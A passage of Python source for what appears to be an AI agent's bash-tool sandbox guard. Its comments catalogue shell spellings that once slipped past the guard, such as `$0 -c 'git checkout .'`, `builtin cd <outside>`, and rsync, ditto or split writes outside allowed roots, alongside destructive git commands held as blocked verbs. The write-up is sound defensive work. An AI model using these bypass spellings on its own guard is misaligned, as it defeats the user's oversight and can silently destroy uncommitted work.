#                                     under `--out` even a deleting mode edits the
#                                     copy, not the input
#   zip -U src.zip --out o.zip -m     rc=0, warning "can't set method, move, recurse,
#                                     or comments with copy mode", and the member is
#                                     still on disk — `-m` is inert here
#
# so in copy mode the destination is the **only** path written, whatever else the
# command line carries. The rows that write nothing, and are named by nothing:
# `--out o.zip` with no operand at all (rc=9), a member pattern matching nothing
# (rc=12), a source that does not exist (rc=18), `--out=` with an empty value (rc=0,
# no file created anywhere — an empty token must never be named, because
# `realpath("")` is the cwd), and a trailing `-O` with nothing after it (rc=16).
#
# The **cluster** spelling is read by the one cluster reader in this file
# (`_short_cluster_option`), the same one the operand walk uses — see
# `_ZIP_OUT_CLUSTER_LETTERS` beside `_zip_out_values`, and issue #1441 for the
# source-first row (`zip <src> -UO <out>`) that named the **source** while the
# archive really written outside was named by nothing.
_ZIP_DESTINATION_OPTIONS = frozenset({"-O", "--out"})

# Verbs that *create* every path named by an operand (`touch a b c`,
# `mkdir -p a/b`). They were invisible to the write-target walk (issue #1398):
# with no target named, the loop that judges targets never ran, so both checked
# tiers answered ALLOW. Measured on master `53c6faef76cde822`, in one geometry
# whose target was outside every allowed root: `touch <outside>/t`,
# `mkdir <outside>/d`, `ln -s x <outside>/l`, `install -m 644 x <outside>/i`,
# `dd if=/dev/zero of=<outside>/d` and `chmod 777 <outside>/t` were all ALLOW
# while `cat > <outside>/f` and `rm -rf <outside>` were refused — and driven end
# to end through the tool, `touch` and `mkdir` really created the file and the
# directory in that same directory. No OS-level boundary backstops the scan, so
# an ALLOW there *is* the write.
#
# The walk needs no new kind of check for these: `_positional_args` already
# drops an option's value (so a mode or a size is never named as a path) and the
# last-operand rule is the one `mv`/`cp` already use. What each branch below
# decides is *which* operand a verb writes.
_CREATING_VERBS = frozenset({"touch", "mkdir", "mkfifo", "mknod"})

# Verbs that create their *first* operand only. `mknod <name> <type> [<major>
# <minor>]` creates the node and then *reads* the rest of its operands (`p` / `b`
# / `c` and the device numbers), so the every-operand reading above would name
# tokens that are not paths — the rule `_positional_args`'s docstring sets out.
# `mkfifo` is not here for the opposite reason: `mkfifo a b` really makes two.
#
# `mkfifo`, `mknod` and `link` were measured after issue #1398's fix landed on
# its own branch: all three were still ALLOW/ALLOW with an *empty* target list in
# the same geometry that fix used (every path outside every allowed root), i.e.
# the same class the fix was for, one verb list short of covering it.
_FIRST_OPERAND_CREATING_VERBS = frozenset({"mknod"})

# Verbs whose destination is the last operand (`ln <src> <dst>`, `cp <src> <dst>`,
# `mv <src> <dst>`, `link <src> <dst>`) — read with each verb's own option table,
# plus `-t <dir>` / `--target-directory`, which moves the destination off the
# operand it displaces and turns that operand into a source.
#
# `cp`/`mv` are read here rather than with the shared `_OPTIONS_WITH_VALUE` table
# they used to get: that table's `-s` is a *size* (for `truncate`/`shred`), and
# reading it for `cp` consumed the source as `-s`'s value, so `cp -s x <target>`
# — which really creates a symlink at `<target>` — named no target at all and
# both tiers allowed it (measured while fixing issue #1398). The same table also
# hid `-t <dir>` behind the last-operand rule, naming the *source* instead.
_DESTINATION_LAST_VERBS = frozenset({"ln", "cp", "mv", "install", "link", "ditto"})

# `ditto` is the macOS copier (`Usage: ditto [ <options> ] src [ ... src ] dst`),
# and it belongs to the set above for the reason that line states — but it was
# missing from it, so **every** form was invisible to the walk: measured on master
# `35284a01`, in a geometry whose destination lay outside every allowed root,
# `ditto <outside>/src <outside>/dst` reported an **empty target list** and
# answered ALLOW at both tiers, while `cp` and `rsync` on the same two paths were
# refused. An empty list is allowed by construction, so the loop that judges
# targets never ran — the same fail-open the compressor family (#1418) and the
# everyday writers (#1398) had, one installed binary over.
#
# Ground truth first, because the verdict alone is not evidence that a verb needs
# the write treatment. Taken on this host (`/usr/bin/ditto`, macOS 26.6) in a fresh
# scratch directory per row, the listing read back off disk afterwards:
#
#   ditto f g                   rc=0  creates g                     `f` is a read
#   ditto -c -k f arc.zip       rc=0  creates arc.zip               the archive is dst
#   ditto -x -k arc.zip outdir  rc=0  creates outdir/f              extracting writes dst
#   ditto --arch arm64 f g      rc=0  creates g, `arm64` consumed    not an operand
#   ditto --bom nope.bom f g    rc=1  writes nothing                 the bom is a read
#   ditto f                     rc=0  writes nothing                 "No destination"
#   ditto --help                rc=1  writes nothing                 nothing to name
#
# So the destination is the last operand in every writing form — the archive when
# one is created, the directory when one is extracted into — and the two forms
# that write nothing have no second operand to name. That is `cp`'s rule exactly,
# which is why this is a member of the set rather than a branch of its own.
#
# `--keepBinariesList <path>` is the one option here that **creates** a file, and
# it does so *in addition* to the destination:
#
#   ditto --keepBinaries --keepBinariesList kept.txt src/ dst/  →  kept.txt created
#   ditto --keepBinariesList kept_no.txt src/ dst/              →  kept_no.txt too
#   ditto --keepBinaries --keepBinariesList=kept_eq.txt src/ …  →  the `=` form too
#
# (all rc=0, each row in its own scratch directory, the file's presence read off
# disk; the second row is why it is read **unconditionally** rather than only
# beside `--keepBinaries`). A value naming an unwritable directory exits 1 and
# creates nothing — naming it anyway is this walk's fail-closed direction, the
# same one `curl -o` is read with.
#
# Sharing this branch lends `ditto` the `-t <dir>` reading as well, and there it is
# read despite `-t` being no option of the verb's: measured, `ditto -t OUT src dst`
# prints `invalid option -- t` and writes nothing. Naming that token is therefore
# the fail-closed direction — a command that writes nothing is refused — while no
# *writing* spelling of `ditto` contains a `-t` at all, so no real write is blocked.
_DESTINATION_LAST_OPTION_TARGETS: dict[str, frozenset[str]] = {
    "ditto": frozenset({"--keepBinariesList"}),
}


# `rsync SRC... DEST` rewrites `DEST` — it is `cp` with a network, so its
# destination is the last operand, exactly as `cp`'s is. It is read in its own
# branch rather than added to `_DESTINATION_LAST_VERBS`, because two parts of that
# rule do not hold for it: `-t` is *preserve times* (it takes no value at all,
# where `cp -t` is `--target-directory`), so the shared `-t` reader would name the
# **source** in `rsync -t src dst`; and a flag can turn the very same operand into
# a pure read, which none of the verbs in that set can do.
#
# Measured on this host (`openrsync`, "rsync version 2.6.9 compatible",
# 2026-09-19), in a scratch tree with the content of the destination read back off
# disk: `rsync -a src/a.txt dst/victim.txt` really overwrites `victim.txt` (it
# held `SOURCE` afterwards), while `rsync -an …` and `rsync --list-only …` really
# leave it alone, and `rsync -a src/ dst/` really copies into `dst/`. The
# predicate answered **ALLOW with an empty target list** for every one of them, at
# both tiers and against a protected daemon file and a workspace file alike, while
# `cp`, `truncate` and `tee` on the same two paths were refused: the same fail-open
# the everyday-writer class (#1398) and the compressor family (#1418) had.
#
# `-n` is the dry-run letter, and it is the one letter in this family that turns
# the run into a read; every rsync short option that takes a *value* (`-e`, `-f`,
# `-T`, `-M`, `-B`, and GNU's `-@`) has a different letter, so no value can be
# mistaken for it (the table below is where those spellings are enumerated), while
# `--dry-run`, `--list-only` and `-n` inside a cluster (`-an`, `-avzn`) all
# mean the same thing.
_RSYNC_READ_LETTERS = frozenset({"n"})
_RSYNC_READ_LONG = frozenset({"--dry-run", "--list-only"})

# The options that take their value as the **next token**. Without this table a trailing
# spaced value displaces the destination: consumed as an operand, it becomes the last
# one, which is the position the rule above reads as `DEST`.
#
# Measured on master `edba48ca` with the real predicate, nothing executed, the
# destination outside every allowed root: `rsync -a src/ /out/dest/ --exclude pat`
# reported `['pat']` and **ALLOW at both tiers**, while the same command without the
# trailing option reported `['/out/dest/']` and was refused — so the option's value, not
# the operand rule, was what displaced it. The run really does write the destination:
# `rsync -a src/ dst/ --exclude pat` in a scratch tree left the file at `dst/` (rc=0).
# The same displacement was measured for `-e ssh`, `-f …`, `-B …`, `-T …`,
# `--out-format …`, and for the clustered `-ve ssh`. Option-**first** spellings
# (`rsync -a --exclude pat src/ dst/`) were already correct, which is why the file's
# other tests never caught it: they pin that spelling and the attached `--exclude=pat`.
#
# The table is keyed by option *shape*, not by run, so it must cover both implementations
# the guard meets. On this host (`openrsync`, "rsync version 2.6.9 compatible",
# 2026-09-20) each entry was measured in a scratch tree against flag controls
# (`--delete`, `--stats`, `--progress`, `-v`, `-r` all came back *not* value-taking, so
# the discriminator was shown to discriminate before it was believed): an entry is listed
# when the following token was consumed — rc=0 with the extra source left uncopied, or a
# diagnostic naming that very token as a bad numeric/filter/directory argument. The long
# options openrsync rejects outright ("unknown option") are still listed when GNU rsync
# takes a value for them: an option the running tool rejects cannot have a path for a
# value either, and CI runs GNU rsync, where it takes one.
_RSYNC_OPTIONS_WITH_VALUE = frozenset({
    # Short spellings, measured here. `-@` is GNU's `--modify-window`, which openrsync
    # spells in the long form only (listed below).
    "-e", "-f", "-B", "-M", "-T", "-@",
    # Measured value-taking on the installed openrsync.
    "--exclude", "--include", "--filter", "--exclude-from", "--files-from",
    "--chmod", "--bwlimit", "--timeout", "--max-size", "--log-file",
    "--out-format", "--log-format", "--log-file-format", "--suffix",
    "--backup-dir", "--temp-dir", "--partial-dir", "--link-dest", "--rsync-path",
    "--port", "--protocol", "--sockopts", "--address", "--modify-window",
    "--compress-level", "--checksum-seed", "--contimeout", "--max-delete",
    "--write-batch", "--only-write-batch", "--password-file",
    # GNU-only spellings: rejected here, value-taking there.
    "--min-size", "--max-alloc", "--compare-dest", "--copy-dest",
    "--checksum-choice", "--cc", "--compress-choice", "--zc",
    "--compress-threads", "--zt", "--skip-compress", "--block-size", "--stderr",
    "--info", "--debug", "--usermap", "--groupmap", "--chown", "--early-input",
    "--outbuf", "--stop-at", "--stop-after", "--time-limit", "--confine-root",
    "--config", "--dparam", "--remote-option", "--copy-as", "--iconv",
})

# The letters of the short entries above, **derived** rather than written twice. A
# trailing value can also arrive inside a cluster, where an exact-token test finds
# nothing: `rsync -a src/ dst/ -ve ssh` carries its value in the cluster's last letter,
# and a cluster's last letter is the one that takes the value.
_RSYNC_SHORT_VALUE_LETTERS = frozenset(
    opt[1] for opt in _RSYNC_OPTIONS_WITH_VALUE if len(opt) == 2 and opt[0] == "-"
)

# Named residual of the rule above: `--write-batch=<file>` /
# `--only-write-batch=<file>` make rsync write a *second* path — the option's own
# value — beside the destination operand. It is left unnamed because a batch file
# is a debugging artefact of a transfer, not the transfer; the destination operand
# this rule exists for is named either way, and the table below consumes the value
# in both spellings so it is never mistaken for that operand.

# `split` writes a **family** of derived paths, and its last operand is the only
# place their common prefix is spelled: `split -b 3 in.txt pre` creates `preaa`,
# `preab`, … The exact names are not derivable from the operand without also
# re-deriving the suffix length (`-a`), its alphabet (`-d`, `--numeric-suffixes`)
# and the chunk count (a function of the input's size), so the *prefix* is named
# and every chunk is under it — over-approximating in the direction this walk
# already errs in (see `_option_destination_values` on repeated options), rather
# than leaving the family unnamed.
#
# Measured on master `e24ff6ea`, predicate only, nothing executed, the target
# outside every allowed root: `split -b 3 <outside>/in <outside>/pre` reported an
# **empty target list**, i.e. ALLOW at both tiers while `cp` on the same two paths
# was refused — the fail-open the everyday-writer class (#1398), the compressor
# family (#1418) and `rsync` (#1419) each had. Ground truth from a scratch
# directory, so the verdict is not the evidence: `split -b 3 in.txt pfx` really
# created `pfxaa pfxab pfxac pfxad` beside `in.txt`.
#
# This table is what keeps the **input** from being named. `split -b 3 in.txt` — one
# operand — writes its chunks under the *default* prefix `xaa…` in the cwd, so a
# reader that mistook the size for an operand would name `in.txt` and block a
# **read**, the direction this walk refuses to err in. The letters and long
# spellings were taken from the two implementations the guard meets: on this host
# BSD `split`'s usage line is `split [-cd] [-l line_count] [-a suffix_length]
# [file [prefix]]` (so `-a`, `-b`, `-l`, `-n`, `-p` take values and `-c`/`-d` take
# none), and the CI platform's GNU twin documents the same plus `-C`/`-t` and the
# long spellings below. A letter the running tool rejects is harmless here: it
# means its "value" is not a path either.
_SPLIT_OPTIONS_WITH_VALUE = frozenset({
    "-a", "--suffix-length",
    "-b", "--bytes",
    "-C", "--line-bytes",          # GNU only
    "-l", "--lines",
    "-n", "--number",
    "-p",                          # BSD only: split on a pattern
    "-t", "--separator",           # GNU only
    "--additional-suffix",
    "--filter",
})

# Named residual of the rule above: GNU's `--filter=COMMAND` hands each chunk to a
# command instead of writing it, and that command may write anywhere the walk is
# not looking. It is left to the shell it names rather than guessed at, and the
# prefix operand is still reported, so a `split --filter=… in pre` is judged by
# where its own chunks would have landed.

# `install <src> <dst>` is `cp` with a mode, so the rule above reads it; it is
# listed separately here only because its `-d` form inverts that rule — every
# operand is a directory to *create*, so a last-operand reading names one of them
# and lets the others past.
_DIRECTORY_INSTALL_VERBS = frozenset({"install"})

# Verbs whose first operand is a mode or an owner, not a path (`chmod 777 f`,
# `chown root f`). Naming the mode would point the block at something that is not
# a file, which is the rule `_positional_args`'s docstring already sets out.
_METADATA_VERBS = frozenset({"chmod", "chown", "chgrp"})

# A mode-looking first operand: octal (`777`, `0644`) or symbolic (`u+x`, `a=r`,
# `-x`). A *test* rather than "drop the first operand", because `--reference=<f>`
# supplies the mode instead — and then the first operand really is the target.
_MODE_LIKE_RE = re.compile(r"^(?:[0-7]{1,4}|[ugoa]*[+-=][rwxXstugo]*)$")

# Options that take their value as the *next* token. Filtering arguments by
# `not startswith("-")` alone cannot tell an option's value from an operand:
# `truncate -s 0 a.txt` yields `0` (the size) as the first non-flag token, so
# the block would name the size instead of the file. Only the options that
# actually appear in the verbs covered below are listed — this stays a
# decision aid, not a full getopt implementation.
_OPTIONS_WITH_VALUE = frozenset({
    "-s", "--size",          # truncate
    "-o", "--output",        # tee
    "-n", "-N", "-s", "--size",  # shred
    "-e", "--expression",    # sed
})

# The same table, **per verb**, for the verbs whose operands issue #1398 added.
# A shared table cannot answer this question, because the same option means
# different things to different verbs: `-s` takes a size for `truncate`/`shred`
# and takes *no* value at all for `ln`. The first version of the `ln` rule read
# the shared table, so `ln -s x <target>` had its source consumed as `-s`'s value
# and reported no target at all — measured while fixing this, and the reason the
# entries below are keyed rather than merged into the set above.
#
# Each entry lists only what that verb needs; a verb absent here has no option
# known to take a spaced value, which is `_NO_OPTION_WITH_VALUE`.
_NO_OPTION_WITH_VALUE = frozenset()
_VERB_OPTIONS_WITH_VALUE = {
    # `-r`/`--reference=<f>` is the file whose timestamps are *copied*: naming it
    # would point the block at a file the command only reads, and `touch -r
    # /etc/passwd <inside>/f` was a false block while it was unlisted.
    "touch": frozenset({"-d", "--date", "-t", "-r", "--reference"}),
    "mkdir": frozenset({"-m", "--mode"}),
    "mkfifo": frozenset({"-m", "--mode"}),
    "mknod": frozenset({"-m", "--mode"}),
    # `link` is `ln` without options — the one verb here that takes no option
    # with a value at all.
    "link": _NO_OPTION_WITH_VALUE,
    # `-S`/`--suffix` is a suffix, and `-t`/`--target-directory` is the
    # destination directory (`_target_directory_values` reads the same flag, and
    # reading it in both places is deliberate: without the table entry the
    # directory stays in the operand list and the last-operand rule then names
    # it a *source*).
    "ln": frozenset({"-S", "--suffix", "-t", "--target-directory"}),
    "cp": frozenset({"-S", "--suffix", "-t", "--target-directory"}),
    "mv": frozenset({"-S", "--suffix", "-t", "--target-directory"}),
    "install": frozenset({
        "-m", "--mode", "-o", "--owner", "-g", "--group", "-S", "--suffix",
        "-t", "--target-directory",
    }),
    # `--reference=<f>` supplies the mode/owner, so it is the one option here
    # whose *presence* also changes how the operands are read — see
    # `_metadata_write_targets`.
    "chmod": frozenset({"--reference"}),
    "chown": frozenset({"--reference"}),
    "chgrp": frozenset({"--reference"}),
    # `dd` is read by its own `of=` helper rather than by an operand rule; the
    # entry keeps the table total over the verbs the walk now reads.
    "dd": _NO_OPTION_WITH_VALUE,
    # `ditto`'s own usage line (`ditto [ <options> ] src [ ... src ] dst`) is the
    # source of this list, and the entry exists for the reason every other one
    # does: without it the option's *value* is read as an operand. Two of them
    # name paths and are consequently also destination tables — `--bom` is a
    # **read** (measured: `ditto --bom nope.bom f g` exits 1 with the bom absent)
    # and `--keepBinariesList` is a write, so it lives in
    # `_DITTO_OPTION_DESTINATIONS` below rather than being named here. The rest
    # (`--arch`, `--lang`, `--outBom`, `--keepBinariesPattern`,
    # `--zlibCompressionLevel`) take values that are not paths at all: naming one
    # as a destination would be the false block `_positional_args` exists to
    # avoid (`--zlibCompressionLevel 9` would name `9`).
    "ditto": frozenset({
        "--arch", "--bom", "--keepBinariesList", "--keepBinariesPattern",
        "--lang", "--outBom", "--zlibCompressionLevel",
    }),
}

# Git mutating commands — blocked under read-only (community issue #979,
# heinrichneb dev.to comment on the 2026-08-20 data-loss postmortem): the
# incident's actual killers (`git stash`, `git checkout .`, `git reset --hard`,
# `git clean`) were NOT caught by the rm/rmdir/mv/cp checks. Under read-only
# these must be structurally impossible, not merely discouraged by a prompt
# rule — "rules can regress; topology can't". Read-only git reads (status /
# fetch / log / diff / remote) stay allowed.
#
# ⚠️ These are matched against the **parsed** command (the resolved verb), not
# against raw command text (issues #1156 + #1159). Both filed defects had the
# same root cause: a regex over the raw string is a statement about *spelling*,
# while the guard's purpose is a statement about *effect*.
#
#   - Under-block (#1156): a git global option sits exactly where the old
#     pattern expected the subcommand, so `git -C . checkout .`,
#     `git -c x=1 stash` and `git --work-tree=. reset --hard` were all allowed
#     (7/7 mutators × 4/4 spellings).
#   - Under-block (#1159): a verb never on the list — `git read-tree -u --reset
#     HEAD` destroys uncommitted work and was allowed. `--reset` is a substring
#     but not the verb, so it did not match.
#   - Over-block: the same raw-text scan refused commands that merely *mention*
#     a mutator (a string literal inside a heredoc), and `git merge-base` was
#     refused as though it were `git merge`.
#
# Parsing fixes all three at once and is the reason this is a verb set rather
# than more regex: the unit of protection becomes the resolved verb.
#
# ⚠️ The set is a **read allowlist** and the default is BLOCK
# (`_git_invocation_is_mutator` returns the verb for anything not listed). The
# earlier design was the opposite — a blocklist of mutating verbs — and that is
# a category that cannot be completed: `git help -a` lists 169 subcommands and
# upstream adds more, so "not on the list" is a permanent, growing set of
# *allowed* commands. Measured on the blocklist: 129 of 169 subcommands stayed
# allowed, and `git checkout-index -f -a` — which overwrites uncommitted work
# exactly like `git checkout` — was blocked only by accident, because the old
# raw-text regex matched `checkout` as a *substring* of `checkout-index`.
# Parsing the verb correctly removed that accident and exposed the hole.
# Fail-closed deletes the category: a verb is allowed only when it is listed
# here as one that prints information and writes nothing. Unknown and future
# subcommands block by default, which is the safe direction for a guard whose
# failure mode is silent, irreversible data loss.
_GIT_READ_VERBS = frozenset({
    # porcelain interrogators — print information, write nothing
    "status", "log", "show", "diff", "diff-files", "diff-index", "diff-tree",
    "diff-pairs", "shortlog", "whatchanged", "describe", "blame", "annotate",
    "name-rev", "rev-list", "rev-parse", "range-diff", "grep", "ls-files",
    "ls-tree", "ls-remote", "cat-file", "merge-base", "merge-tree",
    "for-each-ref", "for-each-repo", "show-branch", "show-index", "show-ref",
    "count-objects", "verify-commit", "verify-pack", "verify-tag", "patch-id",
    "get-tar-commit-id", "fsck", "refs", "revisions", "var",
    "version", "help", "repository-layout",
    # pure stdin/stdout text filters — read a stream, print a stream
    "check-attr", "check-ignore", "check-mailmap", "check-ref-format",
    "fmt-merge-msg", "mailmap",
    "stripspace", "column",
    # Deliberately absent: `mailinfo <msg> <patch>` writes both named paths,
    # `mailsplit -o <dir>` writes into dir. They were listed here as "text
    # filters" and are writers; the allowlist is default-BLOCK, so leaving
    # them out is the fix.
    # Remote-tracking / credential inspection: these write only under .git or
    # in the user's credential store, never the working tree — and issue #979 is
    # a dirty-tree guard. `fetch` is deliberately kept: the previous design
    # allowed it, it cannot destroy uncommitted work, and refusing it would be a
    # usability regression with no safety gain.
    "fetch",
    # `git cherry` reports the commits that are not upstream. Unlike the
    # three verbs above it has no writing subcommand at all, so there is no
    # shape to decide — it belongs on the read list rather than in the shape
    # logic (issue #1240).
    "cherry",
})
# Verbs whose *shape* decides — the verb alone says nothing about the effect.
# Kept out of `_GIT_READ_VERBS` so each is judged by explicit logic, and each
# defaults to BLOCK when its shape is not a proven read.
_GIT_SHAPE_DECIDED = frozenset({"stash", "worktree", "submodule", "remote",
                                "branch", "tag", "config", "hash-object",
                                "interpret-trailers", "credential",
                                # issue #1240: these three are reads in their
                                # reporting shape and writes in another, so the
                                # verb alone cannot decide them — they were
                                # previously refused outright, which made the
                                # reason string ("mutating command") false about
                                # them and cost a downgraded cycle the one read
                                # that explains a dirty tree (`git reflog`).
                                "reflog", "notes", "bisect"})
# Listing flags for `branch` / `tag`: with one of these the command prints and
# writes nothing, even when a pattern argument follows (`git tag -l 'v*'`).
# `--output <file>` / `--output=<file>`: the redirect the diff-family readers
# spell as an option.
_OUTPUT_FLAG_RE = re.compile(r"--output(?:-file)?(?:=|$)")
_GIT_LIST_FLAGS = frozenset({"-l", "--list", "-a", "--all", "-r", "--remotes",
                             "-v", "-vv", "--verbose", "--contains", "--merged",
                             "--no-merged", "--points-at", "--format",
                             "--show-current", "--column", "--sort", "--color",
                             "--no-color", "--ignore-case"})
# `git branch -a` / `git tag -l` / `git tag` are reads; a delete or force flag
# makes them destructive (`git branch -D old`, `git tag -d v1`).
#
# `--unset-upstream` belongs here for the same reason as `--delete`: it writes
# (it removes the branch's upstream from `.git/config`), and it takes no
# argument, so no positional rule can catch it — measured 2026-09-16, it was
# ALLOWED under read-only and really did clear the upstream.
_GIT_WRITE_FLAGS = frozenset({"-d", "-D", "--delete", "-f", "--force", "-m",
                              "-M", "--move", "--set-upstream-to", "-u",
                              "--unset-upstream"})
# `git config` reads unless it writes: read flags, or no positional key.
_GIT_CONFIG_READ_FLAGS = frozenset({"--get", "--get-all", "--get-regexp",
                                    "-l", "--list", "--get-urlmatch"})
# The flags that write. Naming them explicitly is the difference between a
# decision about the flag and an accident of the positional rule below: `--add
# k v` blocks because it leaves two positionals, `--replace-all k v r` for the
# same reason — but `--unset k` leaves one and read as a read, `--edit` leaves
# none. Measured on master with git 2.50.1, six spellings wrote while read-only
# said ALLOW: `--unset`, `--unset-all`, `--edit`, `-e`, `--remove-section`, and
# the subcommand `edit`. The mirror image was also live: `git config get k` — a
# pure read in git's subcommand spelling — was refused as a write.
_GIT_CONFIG_WRITE_FLAGS = frozenset({"--unset", "--unset-all", "--add",
                                     "--replace-all", "--rename-section",
                                     "--remove-section", "--edit", "-e"})
# git 2.46+ accepts the same operations as subcommands without the `--`. Both
# spellings must land on the same verdict; the lists are kept apart on purpose,
# because `set`/`unset`/`edit` in *command* position are writes while the same
# words as a config *key* are not our business. Only the one-word subcommands
# actually need this branch (`unset k` is still caught below by leaving two
# positionals); `git config edit` leaked precisely because its flag form has no
# argument to count, so the rule that saved the others was not a rule at all.
_GIT_CONFIG_WRITE_SUBCOMMANDS = frozenset({"set", "unset", "unset-all", "add",
                                           "replace-all", "rename-section",
                                           "remove-section", "edit"})
_GIT_CONFIG_READ_SUBCOMMANDS = frozenset({"get", "get-all", "get-regexp",
                                          "get-urlmatch", "list"})
# The `git config` options that take a SEPARATE value. `_GIT_SUBCOMMAND_WITH_VALUE`
# is shared by every verb, so they are named here instead of there: a value left
# in the positional list is not neutral, it is counted — and the count is what
# decides the verb. Measured with git 2.50.1 (issue #1273, row 3), every one of
# these leaves a single positional key, so each **reads**, and each was refused
# as a write:
#   git config --file <p> user.name            rc=1, no file touched
#   git config -f <p> user.name                rc=1, no file touched
#   git config --type int user.name            rc=1, no file touched
#   git config --default fallback user.name    rc=0, no file touched
# `--blob` and `--comment` are here for the same reason — that they take a value
# — not because each was caught over-blocking: `--comment note user.name probe`
# really wrote `.git/config` (rc=0), and the value was already the second
# positional there, so that spelling blocks either way.
# Adding a value still blocks: skipping the option's value leaves the key and the
# value the caller wrote, which is two positionals. `git config --file <p> user.name
# probe` really wrote `<p>` (rc=0, bytes changed) and is still refused.
#
# Membership is the whole of this set's safety, so it is **measured** rather than
# asserted here (issue #1291): a value-less member swallows a genuine positional
# and the count then reads a write as a read — `git config --no-type a.b c` really
# writes `.git/config` (rc=0) and 7 more of the 16 value-less options measured do
# the same. `tests/test_bash_tool_sandbox.py::test_every_config_value_option_consumes_its_value`
# asks git itself, with nothing after the option: a value-taking member is reported
# as `error: option `file' requires a value` (`switch `f' …` for the short form),
# while a value-less one runs on to `error: no action specified` and one git does
# not know to `error: unknown option`. It then re-runs each member in the shape this
# walk counts and compares every byte. The byte watch alone was not enough to make
# that a measurement — a command git *refuses* changes no bytes either: with
# `--local` added to this set and a dot-less probe value, the watch stayed green
# while `git config --local user.name probe` was allowed at read-only. Adding a
# member is therefore a change that has to come past git's own answer (and past the
# value table the probe needs), not past a comment.
_GIT_CONFIG_VALUE_OPTS = frozenset({"--file", "-f", "--blob", "--type",
                                    "--default", "--comment"})
# git global options that take a SEPARATE argument — the parser must skip both
# the option and its value to find the verb (`git -C . checkout .`).
_GIT_GLOBAL_WITH_VALUE = frozenset({"-C", "-c", "--exec-path", "--git-dir",
                                    "--work-tree", "--namespace", "--super-prefix"})

# git *subcommand-level* options that also take a SEPARATE value. They are not
# global options, so the splitter above does not skip their values — and without
# this set a value occupies the subcommand slot: `git notes --ref refs/notes/x
# list` read `refs/notes/x` as the subcommand, and `git reflog -n 5` read `5` as
# it, so both were refused as "mutating" (issue #1240, measured 2026-09-15).
#
# Only flags whose value is mandatory belong here. Adding one that takes no value
# would let the *subcommand* be skipped, which is the fail-open direction; each
# entry below is a real separator-form option of a verb in `_GIT_SHAPE_DECIDED`.
_GIT_SUBCOMMAND_WITH_VALUE = frozenset({
    "-n", "--max-count", "--skip", "--ref", "--date", "--pretty", "--format",
    "--grep", "--author", "--committer", "--since", "--until",
})
# Shell operators that separate one command from the next in a chain.
_SHELL_SEPARATORS = frozenset({"&&", "||", ";", "|", "&", "\n"})
# Tokens that put what follows them in command position without being commands
# themselves: grouping (`( … )`, `{ … }`) and shell negation (`! cmd`).
_COMMAND_POSITION_OPERATORS = frozenset({"(", "{", "!", "`", ">(", "<(", ")"})
# Shell keywords after which the next word is a command, not an argument.
_SHELL_KEYWORD_POSITION = frozenset({"if", "then", "elif", "else", "while", "until", "do"})
# Prefix commands that *run* their argument as a command. `env git checkout .`
# and `sudo git checkout .` genuinely invoke git, so a `git` token after one of
# these is an invocation even though it is not first in the stream. This is the
# case that stops the over-block fix from becoming an under-block.
_COMMAND_WRAPPERS = frozenset({
    # `eval` joins its arguments and executes the result; `-exec`/`-execdir` hand
    # the next word to execve. Both put the command where the walk looks for a
    # wrapper's argument. They are spells of the same prefix, and the flag shape
    # is deliberate: the value-skip below is what keeps `find . -exec grep git
    # {} \;` allowed, because `grep` is consumed as the flag's value.
    "eval", "-exec", "-execdir",
    # `builtin cd <dir>` is `cd <dir>` reached by its other spelling, and it was
    # the one prefix that left the candidate out of command position: measured on
    # master, `builtin cd <outside> && echo x > f.txt` created `<outside>/f.txt`
    # while the guard read the relative target as in-workspace and allowed it,
    # and the same held for `builtin cd -P <outside>`, `(builtin cd <outside> …)`
    # and `sh -c 'builtin cd <outside>; …'` (issue #1362). `builtin` prefixes
    # exactly one word, like `command`, so it belongs to the same list — and the
    # gap was here rather than in the walk: every consumer of
    # `_runs_as_a_command` read `builtin <cmd>` as an argument, not just this one.
    # The cost is the same over-approximation the others carry: `echo builtin cd
    # <dir>` reads `cd` as an invocation too (measured — a false block, in the
    # loud direction, of the class `echo command cd <dir>` already had).
    "builtin",
    "env", "sudo", "doas", "xargs", "nohup", "time", "timeout", "nice",
    "setsid", "stdbuf", "command", "exec", "ionice", "chrt", "watch",
})
# `FOO=1 git checkout .` — the shell strips leading assignments and runs the
# rest, so an assignment is a prefix, not a command.
_ENV_ASSIGNMENT_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")
# Shells whose `-c <string>` argument is itself a command the shell will run.
# The guard must read *that* text, not stop at the outer token stream: before
# this, `sh -c 'git checkout .'` reached the mutator only because a raw-text
# regex happened to scan the whole line. Parsing the outer tokens alone sees
# `sh`, `-c`, and one opaque string — so a wrapper no longer blocks unless the
# nested text is parsed too. This is a return to the old behaviour by a
# different route: the old scan was right about these 5 shapes and wrong about
# the 7 it missed; parsing must not trade one half for the other.
_SHELL_WRAPPERS = frozenset({"sh", "bash", "zsh", "dash", "ksh", "ash"})
# Commands whose entire argument list is a command the shell will re-parse and
# run (`eval 'git checkout .'`). `xargs`/`env`/`nohup`/`time`/`command` prefix
# a real invocation and are already handled, because the invocation is still in
# the token stream.
_SHELL_EVALUATORS = frozenset({"eval"})
# A program word that is a *variable reference* is one the guard cannot resolve:
# `$SHELL` is `sh`, `bash` or `zsh` depending on the host, and `$HOME` is a
# different absolute path on every one. A guard cannot enumerate how a shell
# spells itself, so the safe direction is to stop reading a decision out of text
# that has not been expanded yet (issue #1244).
#
# A parameter expansion is a **lexeme class, not a list of names**. It has four
# shapes, and only the two simplest were named here at first:
#
#   `$NAME`            `$SHELL`          the form everyone writes
#   `${NAME}`          `${SHELL}`        the same, braced
#   `${NAME<op>...}`   `${SHELL:?}`, `${SHELL:-sh}`, `${SHELL//x/y}`
#   `$X` (special)     `$0`, `$@`, `$?`, `$$` — set by the shell itself
#
# plus any concatenation of these (`${A}${B}`). Measured on master `cca0b8dc`,
# read-only tier, each driven end to end through `BashTool.execute` against a
# scratch repo holding one uncommitted edit: `$0 -c 'git checkout .'`,
# `${SHELL:?} -c 'git checkout .'`, `${SHELL:-sh} -c 'git checkout .'` and
# `${SHELL//x/y} -c 'git checkout .'` all answered ALLOW and all **discarded the
# edit**, while `$SHELL -c 'git checkout .'` blocked on the same mutator. `$0` is
# the shell already running the line, so the word is a wrapper the guard cannot
# place. The class defeated the *path* rule the same way: at workspace-write
# `echo x > ${EMRG_PROBE_OUT:?}/escaped.txt` answered ALLOW and **created the file
# outside the workspace**, while `$EMRG_PROBE_OUT/escaped.txt` blocked. Naming two
# spellings of a class while its other spellings pass is the #461 defect; the
# class is what has to be matched.
_PARAM_EXPANSION = r"\$(?:\{[^}]*\}|[A-Za-z_0-9@*#?$!-][A-Za-z0-9_]*)"
